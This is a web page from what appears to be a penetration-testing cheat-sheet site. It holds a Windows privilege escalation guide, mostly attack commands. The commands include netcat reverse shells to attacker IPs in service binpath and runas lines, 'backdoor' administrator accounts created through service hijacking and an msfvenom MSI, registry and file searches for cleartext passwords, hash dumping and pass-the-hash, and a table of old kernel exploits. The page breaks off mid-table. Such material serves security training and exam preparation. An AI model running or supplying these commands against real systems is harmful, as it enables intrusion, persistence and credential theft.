<!DOCTYPE html>
<html>
  <head>
    <title>Exploit-me.com - CheatSheet</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2022-04-10T15:59:01 CEST">
<title>Windows Privilege Escalation. :: Exploit-me.com - CheatSheet</title>
<link rel="shortcut icon" href="/cheatsheet/images/favicon.png" type="image/x-icon" />
<link href="/cheatsheet/css/nucleus.css" rel="stylesheet">
<link href="/cheatsheet/css/font-awesome.min.css" rel="stylesheet">
<link href="/cheatsheet/css/featherlight.min.css" rel="stylesheet">
<link href="/cheatsheet/css/auto-complete.css" rel="stylesheet">
<link href="/cheatsheet/theme-flex/style.css" rel="stylesheet">

<link rel="stylesheet" href="/cheatsheet/css/bootstrap.min.css">
<meta name="description" content="A Guide to do Windows Privilege Escalation.">



    
  </head>
  <body data-url="/cheatsheet/blog/windows-privilege-escalation/">
    
      <header>
  <div class="logo">
    
	
  
    <a class="baselink" href="/cheatsheet/">Exploit-me.com - CheatSheet</a>
  


  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://exploit-me.com/"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Exploit-Me - Home</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
    <li data-nav-id="/cheatsheet/blog/" class="dd-item haschildren
        ">
      <div>
      <a href="/cheatsheet/blog/">Blogs</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/cheatsheet/blog/osep-cheat-sheet/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/osep-cheat-sheet/">
            OSEP Cheat Sheet for Exam Prepration.
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/resource-based-deligation-via-impacket/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/resource-based-deligation-via-impacket/">
            Resource Based Deligation via Impacket
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/active-directory-exploitation/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/active-directory-exploitation/">
            Active Directory Exploitation Cheat Sheet
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/executing-linux-binaries-without-touching-disk/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/executing-linux-binaries-without-touching-disk/">
            Executing Linux Binaries Without Touching Disk
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/crackmapexec/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/crackmapexec/">
            CrackMapExec (a.k.a CME) 
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/windows-privilege-escalation/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/windows-privilege-escalation/">
            Windows Privilege Escalation.
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/linux-privilege-escalation/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/linux-privilege-escalation/">
            Linux Privilege Escalation
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/cheatsheet/about/" class="dd-item haschildren
        ">
      <div>
      <a href="/cheatsheet/about/">Abouts</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/cheatsheet/about/naveed-ahmed-khan/" class="dd-item">
        <div>
          <a href="/cheatsheet/about/naveed-ahmed-khan/">
            Naveed Ahmed Khan
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/about/asif/" class="dd-item">
        <div>
          <a href="/cheatsheet/about/asif/">
            Asif Durani
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>




    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/cheatsheet/blog/" >
   Blogs</option> 
      <option value="/cheatsheet/blog/osep-cheat-sheet/" >- OSEP Cheat Sheet for Exam Prepration.</option>
      <option value="/cheatsheet/blog/resource-based-deligation-via-impacket/" >- Resource Based Deligation via Impacket</option>
      <option value="/cheatsheet/blog/active-directory-exploitation/" >- Active Directory Exploitation Cheat Sheet</option>
      <option value="/cheatsheet/blog/executing-linux-binaries-without-touching-disk/" >- Executing Linux Binaries Without Touching Disk</option>
      <option value="/cheatsheet/blog/crackmapexec/" >- CrackMapExec (a.k.a CME) </option>
      <option value="/cheatsheet/blog/windows-privilege-escalation/"  selected>- Windows Privilege Escalation.</option>
      <option value="/cheatsheet/blog/linux-privilege-escalation/" >- Linux Privilege Escalation</option>
  
    <option value="/cheatsheet/about/" >
   Abouts</option>



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
      </div>
    

    <h1>Windows Privilege Escalation.</h1>
    
    
    
    <h2 id="windows-privilege-escalation">Windows Privilege Escalation.</h2>
<h3 id="eop-0-system-info">EoP 0: System info</h3>
<p>Finding installed software, running processes, bind ports, and OS version might be critical to identify the right EoP vector.</p>
<p>Find installed patches, architecture, OS version
<code>$ systeminfo</code></p>
<p>Get exact OS version
<code>$ type C:/Windows/system32/eula.txt</code></p>
<p>Hostname.
<code>$ hostname</code></p>
<p>Find current user.
<code>$ echo %username%</code></p>
<p>List all users
<code>$ net users</code></p>
<p>Information about a user
<code>$ net users Administrator</code></p>
<p>Network information
<code>$ ipconfig /all &amp; route print &amp; arp -a</code></p>
<p>Environment
<code>$ set</code></p>
<p>List open connections
<code>$ netstat -aton</code></p>
<p>Firewall information</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">$</span> <span style="color:#111">netsh</span> <span style="color:#111">firewall</span> <span style="color:#111">show</span> <span style="color:#111">state</span>
<span style="color:#111">$</span> <span style="color:#111">netsh</span> <span style="color:#111">firewall</span> <span style="color:#111">show</span> <span style="color:#111">config</span>
</code></pre></div><p>List scheduled tasks</p>
<p><code>$ schtasks /query /fo LIST /v</code></p>
<p>List windows services</p>
<p><code>$ net start</code></p>
<p><code>$ wmic service list brief</code></p>
<p><code>$ tasklist /SVC</code></p>
<h3 id="eop-1-incorrect-permissions-in-services">EoP 1: Incorrect permissions in services</h3>
<p>A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.</p>
<p>We are interested in services where permissions are: <strong>BUILTIN\Users</strong> with <strong>(F)</strong> or <strong>(C)</strong> or <strong>(M)</strong> for our group. More info about permissions:</p>
<pre tabindex="0"><code>https://msdn.microsoft.com/en-us/library/bb727008.aspx
</code></pre><p>Common exploitation payloads involve: Replacing the affecting binary with a reverse shell or a command that creates a new user and adds it to the Administrator group. Replace the affected service with your payload and and restart the service running:</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">$</span> <span style="color:#111">wmic</span> <span style="color:#111">service</span> <span style="color:#111">NAMEOFSERVICE</span> <span style="color:#111">call</span> <span style="color:#111">startservice</span>
<span style="color:#111">net</span> <span style="color:#111">stop</span> <span style="color:#111">[</span><span style="color:#111">service</span> <span style="color:#111">name</span><span style="color:#111">]</span> <span style="color:#111">&amp;&amp;</span> <span style="color:#111">net</span> <span style="color:#111">start </span><span style="color:#111">[</span><span style="color:#111">service</span> <span style="color:#111">name</span><span style="color:#111">]</span>
</code></pre></div><p><code>$ sc start/stop serviceName</code></p>
<p>The following commands will print the affected services:</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">$</span> <span style="color:#00a8c8">for</span> <span style="color:#111">/</span><span style="color:#111">f</span> <span style="color:#d88200">&#34;tokens=2 delims=&#39;=&#39;&#34;</span> <span style="color:#00a8c8">%</span><span style="color:#111">a</span> <span style="color:#00a8c8">in</span> <span style="color:#111">(</span><span style="color:#d88200">&#39;wmic service list full^|find /i &#34;pathname&#34;^|find /i /v &#34;system32&#34;&#39;</span><span style="color:#111">)</span> <span style="color:#00a8c8">do</span> <span style="color:#111">@echo</span> <span style="color:#00a8c8">%</span><span style="color:#111">a</span> <span style="color:#111">&gt;&gt;</span> <span style="color:#111">c:</span><span style="color:#111">\</span><span style="color:#111">windows</span><span style="color:#111">\</span><span style="color:#111">temp</span><span style="color:#111">\</span><span style="color:#111">permissions</span><span style="color:#111">.</span><span style="color:#111">txt</span>
<span style="color:#111">$</span> <span style="color:#00a8c8">for</span> <span style="color:#111">/</span><span style="color:#111">f</span> <span style="color:#111">eol</span><span style="color:#111">^=^</span><span style="color:#d88200">&#34;^ delims^=^&#34;</span> <span style="color:#00a8c8">%</span><span style="color:#111">a</span> <span style="color:#00a8c8">in</span> <span style="color:#111">(</span><span style="color:#111">c:</span><span style="color:#111">\</span><span style="color:#111">windows</span><span style="color:#111">\</span><span style="color:#111">temp</span><span style="color:#111">\</span><span style="color:#111">permissions</span><span style="color:#111">.</span><span style="color:#111">txt</span><span style="color:#111">)</span> <span style="color:#00a8c8">do</span> <span style="color:#111">cmd</span><span style="color:#111">.</span><span style="color:#111">exe</span> <span style="color:#111">/</span><span style="color:#111">c</span> <span style="color:#111">icacls</span> <span style="color:#d88200">&#34;%a&#34;</span>
</code></pre></div><p>If wmic is not available we can use sc.exe:</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">$</span> <span style="color:#111">sc </span><span style="color:#111">query</span> <span style="color:#111">state</span><span style="color:#111">=</span> <span style="color:#111">all</span> <span style="color:#111">|</span> <span style="color:#111">findstr</span> <span style="color:#d88200">&#34;SERVICE_NAME:&#34;</span> <span style="color:#111">&gt;&gt;</span> <span style="color:#111">Servicenames</span><span style="color:#111">.</span><span style="color:#111">txt</span>
<span style="color:#00a8c8">FOR</span> <span style="color:#111">/</span><span style="color:#111">F</span> <span style="color:#00a8c8">%</span><span style="color:#111">i</span> <span style="color:#00a8c8">in</span> <span style="color:#111">(</span><span style="color:#111">Servicenames</span><span style="color:#111">.</span><span style="color:#111">txt</span><span style="color:#111">)</span> <span style="color:#00a8c8">DO</span> <span style="color:#111">echo </span><span style="color:#00a8c8">%</span><span style="color:#111">i</span>
<span style="color:#111">type </span><span style="color:#111">Servicenames</span><span style="color:#111">.</span><span style="color:#111">txt</span>
<span style="color:#00a8c8">FOR</span> <span style="color:#111">/</span><span style="color:#111">F</span> <span style="color:#d88200">&#34;tokens=2 delims= &#34;</span> <span style="color:#00a8c8">%</span><span style="color:#111">i</span> <span style="color:#00a8c8">in</span> <span style="color:#111">(</span><span style="color:#111">Servicenames</span><span style="color:#111">.</span><span style="color:#111">txt</span><span style="color:#111">)</span> <span style="color:#00a8c8">DO</span> <span style="color:#111">@echo</span> <span style="color:#00a8c8">%</span><span style="color:#111">i</span> <span style="color:#111">&gt;&gt;</span> <span style="color:#111">services</span><span style="color:#111">.</span><span style="color:#111">txt</span>
<span style="color:#00a8c8">FOR</span> <span style="color:#111">/</span><span style="color:#111">F</span> <span style="color:#00a8c8">%</span><span style="color:#111">i</span> <span style="color:#00a8c8">in</span> <span style="color:#111">(</span><span style="color:#111">services</span><span style="color:#111">.</span><span style="color:#111">txt</span><span style="color:#111">)</span> <span style="color:#00a8c8">DO</span> <span style="color:#111">@sc</span> <span style="color:#111">qc</span> <span style="color:#00a8c8">%</span><span style="color:#111">i</span> <span style="color:#111">|</span> <span style="color:#111">findstr</span> <span style="color:#d88200">&#34;BINARY_PATH_NAME&#34;</span> <span style="color:#111">&gt;&gt;</span> <span style="color:#111">path</span><span style="color:#111">.</span><span style="color:#111">txt</span>
</code></pre></div><p>You can also manually check each service using cacls:</p>
<p><code>$ cacls &quot;C:\path\to\file.exe&quot;</code></p>
<p>If you don&rsquo;t have access to vmic, you can do:</p>
<p><code>$ sc qc upnphost</code></p>
<p>Windows XP SP1 is known to be vulnerable to EoP in <strong>upnphost</strong>. You get Administrator with:</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">$</span> <span style="color:#111">sc </span><span style="color:#111">config</span> <span style="color:#111">upnphost</span> <span style="color:#111">binpath</span><span style="color:#111">=</span> <span style="color:#d88200">&#34;C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe&#34;</span>
<span style="color:#111">sc </span><span style="color:#111">config</span> <span style="color:#111">upnphost</span> <span style="color:#111">obj</span><span style="color:#111">=</span> <span style="color:#d88200">&#34;.\LocalSystem&#34;</span> <span style="color:#111">password</span><span style="color:#111">=</span> <span style="color:#d88200">&#34;&#34;</span>
<span style="color:#111">sc </span><span style="color:#111">qc</span> <span style="color:#111">upnphost</span>
</code></pre></div><p>If it fails because of a missing dependency, run the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">$</span> <span style="color:#111">sc </span><span style="color:#111">config</span> <span style="color:#111">SSDPSRV</span> <span style="color:#111">start</span><span style="color:#111">=</span> <span style="color:#111">auto</span>
<span style="color:#111">net</span> <span style="color:#111">start </span><span style="color:#111">SSDPSRV</span>
<span style="color:#111">net</span> <span style="color:#111">start </span><span style="color:#111">upnphost</span>
</code></pre></div><p>Or remove the dependency:</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">$</span> <span style="color:#111">sc </span><span style="color:#111">config</span> <span style="color:#111">upnphost</span> <span style="color:#111">depend</span><span style="color:#111">=</span> <span style="color:#d88200">&#34;&#34;</span>
</code></pre></div><p>Using meterpreter:</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">&gt;</span> <span style="color:#111">exploit</span><span style="color:#111">/</span><span style="color:#111">windows</span><span style="color:#111">/</span><span style="color:#111">local</span><span style="color:#111">/</span><span style="color:#111">service_permissions</span>
</code></pre></div><p>If wmic and sc is not available, you can use accesschk. For Windows XP, version 5.2 of accesschk is needed:</p>
<pre tabindex="0"><code>https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
</code></pre><div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">$</span> <span style="color:#111">accesschk</span><span style="color:#111">.</span><span style="color:#111">exe</span> <span style="color:#111">-uwcqv</span> <span style="color:#d88200">&#34;Authenticated Users&#34;</span> <span style="color:#111">*</span> <span style="color:#111">/</span><span style="color:#111">accepteula</span>
<span style="color:#111">$</span> <span style="color:#111">accesschk</span><span style="color:#111">.</span><span style="color:#111">exe</span> <span style="color:#111">-qdws</span> <span style="color:#d88200">&#34;Authenticated Users&#34;</span> <span style="color:#111">C:</span><span style="color:#111">\</span><span style="color:#111">Windows</span><span style="color:#111">\</span> <span style="color:#111">/</span><span style="color:#111">accepteula</span>
<span style="color:#111">$</span> <span style="color:#111">accesschk</span><span style="color:#111">.</span><span style="color:#111">exe</span> <span style="color:#111">-qdws</span> <span style="color:#111">Users</span> <span style="color:#111">C:</span><span style="color:#111">\</span><span style="color:#111">Windows</span><span style="color:#111">\</span>
</code></pre></div><p>Then query the service using Windows sc:</p>
<p><code>$ sc qc &lt;vulnerable service name&gt;</code></p>
<p>Then change the binpath to execute your own commands (restart of the service will most likely be needed):</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">$</span> <span style="color:#111">sc </span><span style="color:#111">config</span> <span style="color:#111">&lt;</span><span style="color:#111">vuln-service</span><span style="color:#111">&gt;</span> <span style="color:#111">binpath</span><span style="color:#111">=</span> <span style="color:#d88200">&#34;net user backdoor backdoor123 /add&#34;</span>
<span style="color:#111">$</span> <span style="color:#111">sc </span><span style="color:#111">stop</span> <span style="color:#111">&lt;</span><span style="color:#111">vuln-service</span><span style="color:#111">&gt;</span>
<span style="color:#111">$</span> <span style="color:#111">sc start </span><span style="color:#111">&lt;</span><span style="color:#111">vuln</span><span style="color:#111">$</span> <span style="color:#111">-service</span><span style="color:#111">&gt;</span>
<span style="color:#111">$</span> <span style="color:#111">sc </span><span style="color:#111">config</span> <span style="color:#111">&lt;</span><span style="color:#111">vuln-service</span><span style="color:#111">&gt;</span> <span style="color:#111">binpath</span><span style="color:#111">=</span> <span style="color:#d88200">&#34;net localgroup Administrators backdoor /add&#34;</span>
<span style="color:#111">$</span> <span style="color:#111">sc </span><span style="color:#111">stop</span> <span style="color:#111">&lt;</span><span style="color:#111">vuln-service</span><span style="color:#111">&gt;</span>
<span style="color:#111">$</span> <span style="color:#111">sc start </span><span style="color:#111">&lt;</span><span style="color:#111">vuln-service</span><span style="color:#111">&gt;</span>
</code></pre></div><p>Note - Might need to use the depend attribute explicitly:</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">$</span> <span style="color:#111">sc </span><span style="color:#111">stop</span> <span style="color:#111">&lt;</span><span style="color:#111">vuln-service</span><span style="color:#111">&gt;</span>
<span style="color:#111">sc </span><span style="color:#111">config</span> <span style="color:#111">&lt;</span><span style="color:#111">vuln-service</span><span style="color:#111">&gt;</span> <span style="color:#111">binPath</span><span style="color:#111">=</span> <span style="color:#d88200">&#34;c:\inetpub\wwwroot\runmsf.exe&#34;</span> <span style="color:#111">depend</span><span style="color:#111">=</span> <span style="color:#d88200">&#34;&#34;</span> <span style="color:#111">start</span><span style="color:#111">=</span> <span style="color:#111">demand</span> <span style="color:#111">obj</span><span style="color:#111">=</span> <span style="color:#d88200">&#34;.\LocalSystem&#34;</span> <span style="color:#111">password</span><span style="color:#111">=</span> <span style="color:#d88200">&#34;&#34;</span>
<span style="color:#111">sc start </span><span style="color:#111">&lt;</span><span style="color:#111">vuln-service</span><span style="color:#111">&gt;</span>
</code></pre></div><h3 id="eop-2-find-unquoted-paths">EoP 2: Find unquoted paths</h3>
<p>If we find a service running as SYSTEM/Administrator with an unquoted path and spaces in the path we can hijack the path and use it to elevate privileges. This occurs because windows will try, for every whitespace, to find the binary in every intermediate folder.</p>
<p>For example, the following path would be vulnerable:</p>
<pre tabindex="0"><code>C:\Program Files\something\winamp.exe
</code></pre><p>We could place our payload with any of the following paths:</p>
<pre tabindex="0"><code>C:\Program.exe
</code></pre><pre tabindex="0"><code>C:\Program Files.exe
</code></pre><p>The following command will display affected services:</p>
<pre tabindex="0"><code>$ wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;
</code></pre><p>We might even be able to override the service executable, always check out the permissions of the service binary:</p>
<pre tabindex="0"><code>$ icacls &quot;C:\Program Files (x86)\Program Folder&quot;
</code></pre><p>You can autoamte with meterpreter:</p>
<pre tabindex="0"><code>&gt; exploit/windows/local/trusted_service_path
</code></pre><h3 id="eop-3-cleartext-passwords-quick-hits">EoP 3: ClearText passwords (quick hits)</h3>
<p>We might somtetimes find passwords in arbitrary files, you can find them running:</p>
<pre tabindex="0"><code>$ findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
</code></pre><p>Find all those strings in config files.</p>
<pre tabindex="0"><code>$ dir /s *pass* == *cred* == *vnc* == *.config*
</code></pre><p>Find all passwords in all files.</p>
<pre tabindex="0"><code>$ findstr /spin &quot;password&quot; *.*
</code></pre><pre tabindex="0"><code>$ findstr /spin &quot;password&quot; *.*
</code></pre><p>These are common files to find them in. They might be base64-encoded. So look out for that.</p>
<pre tabindex="0"><code>$ type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type c:\unattend.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml
</code></pre><pre tabindex="0"><code>$ dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
</code></pre><p>Stuff in the registry:</p>
<pre tabindex="0"><code>$ reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;
reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;
reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
</code></pre><p>Search for password in registry</p>
<pre tabindex="0"><code>$ reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
</code></pre><p>Using meterpreter:</p>
<pre tabindex="0"><code>&gt; post/windows/gather/credentials/gpp
&gt; post/windows/gather/enum_unattend
</code></pre><h3 id="eop-4-pass-the-hash">EoP 4: Pass the hash</h3>
<p>Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.</p>
<p>Windows hash format:</p>
<pre tabindex="0"><code>user:group:id:ntlmpassword::
</code></pre><p>You can do a hash dump in the affected system running:</p>
<pre tabindex="0"><code>wce32.exe -w
wce64.exe -w
fgdump.exe
</code></pre><p>Download and run fgdump.exe on the target machine.</p>
<pre tabindex="0"><code> $ cd /usr/share/windows-binaries/fgdump; python -m SimpleHTTPServer 80
</code></pre><pre tabindex="0"><code>$ pth-winexe -U DOMAIN/user%hash //$ip cmd
</code></pre><p>or:</p>
<pre tabindex="0"><code>export SMBHASH=xxx
$ pth-winexe -U user%  //$ip cmd
</code></pre><p>You can also do run as, with the hash:</p>
<p>Technique 1:</p>
<pre tabindex="0"><code>C:\Windows\System32\runas.exe /env /noprofile /user:&lt;username&gt; &lt;password&gt; &quot;c:\users\Public\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe&quot;
</code></pre><p>Technique 2:</p>
<pre tabindex="0"><code>$ secpasswd = ConvertTo-SecureString &quot;&lt;password&gt;&quot; -AsPlainText -Force
$ mycreds = New-Object System.Management.Automation.PSCredential (&quot;&lt;user&gt;&quot;, $secpasswd)
$ computer = &quot;&lt;hostname&gt;&quot;
[System.Diagnostics.Process]::Start(&quot;C:\users\public\nc.exe&quot;,&quot;&lt;attacker_ip&gt; 4444 -e cmd.exe&quot;, $mycreds.Username, $mycreds.Password, $computer)
</code></pre><pre tabindex="0"><code>$ powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1
</code></pre><p>Technique 3:</p>
<pre tabindex="0"><code>$ psexec64 \\COMPUTERNAME -u Test -p test -h &quot;c:\users\public\nc.exe -nc &lt;attacker_ip&gt; 4444 -e cmd.exe&quot;
</code></pre><h3 id="eop-5-services-only-available-from-loopback">EoP 5: Services only available from loopback</h3>
<p>You can find services bind to the loopback interface that are not reachable through the network running.look for <strong>LISTENING/LISTEN</strong>:</p>
<pre tabindex="0"><code>netstat -ano
</code></pre><p>Port forward using plink</p>
<pre tabindex="0"><code>$ plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
</code></pre><p>Port forward using meterpreter</p>
<pre tabindex="0"><code>$ portfwd add -l &lt;attacker port&gt; -p &lt;victim port&gt; -r &lt;victim ip&gt;
portfwd add -l 3306 -p 3306 -r 192.168.1.101
</code></pre><p>If powershell is blocked, you can download:</p>
<pre tabindex="0"><code>https://github.com/Ben0xA/nps
</code></pre><p>Once you know the updates installed, you can find known exploits using windows-exploit-suggester.</p>
<pre tabindex="0"><code>$ ./windows-exploit-suggester.py -d 2017-02-09-mssb.xls -p ms16-075
[*] initiating winsploit version 3.2…
[*] database file detected as xls or xlsx based on extension
[*] searching all kb’s for bulletin id MS16-075
[+] relevant kbs [‘3164038’, ‘3163018’, ‘3163017’, ‘3161561’]
[*] done
</code></pre><p>Compile windows exploit in linux:</p>
<pre tabindex="0"><code>$ i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe
</code></pre><p>Compiling python scripts to executables:</p>
<pre tabindex="0"><code>$ wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py
</code></pre><h3 id="eop-6-alwaysinstallelevated">EoP 6: AlwaysInstallElevated</h3>
<p><strong>AlwaysInstallElevated</strong> is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.</p>
<p>Check if these 2 registry values are set to &ldquo;1&rdquo;:</p>
<pre tabindex="0"><code>$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</code></pre><p>If they are, create your own malicious msi:</p>
<pre tabindex="0"><code>$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
</code></pre><p>Then use msiexec on victim to execute your msi:</p>
<pre tabindex="0"><code>$ msiexec /quiet /qn /i C:\evil.msi
</code></pre><p>Metasploit module:</p>
<pre tabindex="0"><code>&gt; use exploit/windows/local/always_install_elevated
</code></pre><h3 id="eop-7-vulnerable-drivers">EoP 7: Vulnerable drivers</h3>
<p>Third party drivers might contain vulnerabilities, find them running:</p>
<pre tabindex="0"><code>$ DRIVERQUERY
</code></pre><h3 id="eop-8-kernel-vulnerabilities">EoP 8: Kernel vulnerabilities</h3>
<p>Run exploit suggester against systeminfo:</p>
<pre tabindex="0"><code>https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
</code></pre><pre tabindex="0"><code>$ python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt
</code></pre><p>Find installed paths:</p>
<pre tabindex="0"><code>$ wmic qfe get Caption,Description,HotFixID,InstalledOn
</code></pre><p>Comprehensive talbes of vulnerabilities below:</p>
<pre tabindex="0"><code>eDB   Vuln Name         MS#     2K       XP     2003    2008      Vista      7
271   Lsasrv.dll     MS04-011  SP2,3,4  SP0,1    -       -        -         -
350   Util Manager   MS04-019  SP2,3,4  -        -       -        -         -
351   POSIX          MS04-020  SP4      -        -       -        -         -
352   Univ lang. UtilMS04-019   -       SP2,3,4  -       -        -         -
355   Univ lang. UtilMS04-019   -       SP2,3,4  -       -        -         -
1149  PnP Service    MS05-039  P4       SP2      SP1     -        -         -
1197  keybd_event    -         all      all      all     -        -         -
1198  CSRSS          MS05-018  SP3,4    SP1,2    -       -        -         -
1407  Kernel APC     MS05-055  SP4      -        -       -        -         -
1911  Mrxsmb.sys     MS06-030  all      SP2      -       -        -         -
2412  Windows Kernel MS06-049  SP4      -        -       -        -         -
3220  Print spool    -         -        All      -       -        -         -
5518  win32k.sys     MS08-025  SP4      SP2      SP1,2   SP0      SP0,1       -
6705  Churrasco      MS09-012  -        -        All     -        -         -
6705  Churraskito    -         -        All      All     -        -         -
21923 Winlogon       -         All      All      -       -        -         -
11199 KiTrap0D       MS10-015  All      All      All     All      All       All
14610 Chimichurri    MS10-059  -        -        -       All      All       SP0
15589 Task Scheduler MS10-092  -        -        -       SP0,1,2  SP1,2     SP0
18176 AFD.Sys        MS11-080  -        SP3      SP3     -        -         -
100   RPC DCOM       MS03-026  SP3,4    -        -       -        -         -
103   RPC2           MS03-039  all (CN) -        -       -        -         -
109   RPC2           MS03-039  all      -        -       -        -         -
119   Netapi         MS03-049  SP4      -        -       -        -         -
3022  ASN.1          MS04-007  SP2,3,4  SP0,1    -       -        -         -
275   SSL BOF        MS04-011  SP4      ?        -       -        -         -
295   Lsasarv.dll    MS04-011  SP2,3,4  SP0,1    -       -        -         -
734   NetDDE BOF     MS04-031  SP2,3,4  SP0,1    -       -        -         -
1075  Messaging QueueMS05-017  SP3,4    SP0,1    -       -        -         -
1149  PnP Service    MS05-039  SP4      -        -       -        -         -
2223  CP             MS06-040  -        SP1      -       -        -         -
2265  NetIPSRemote   MS06-040  SP0-4    SP0,1    -       -        -         -
2789  NetPManageIP   MS06-070  SP4      -        -       -        -         -
7104  Service exec   MS08-067  SP4      SP2,3    SP1,2   SP0      SP0,1     -
7132  Service exec   MS08-067  SP4      -        SP2     -        -         -
14674 SRV2.SYS SMB   MS09-050  -       -         -       -        SP1,2     -
</code></pre><pre tabindex="0"><code>   MS*           HotFix                         OS
MS16-032     KB3143141    Windows Server 2008 ,7,8,10 Windows Server 2012
MS16-016        KB3136041    Windows Server 2008, Vista, 7 WebDAV
MS15-051     KB3057191     Windows Server 2003, Windows Server 2008, Windows 7, Windows 8, Windows 2012
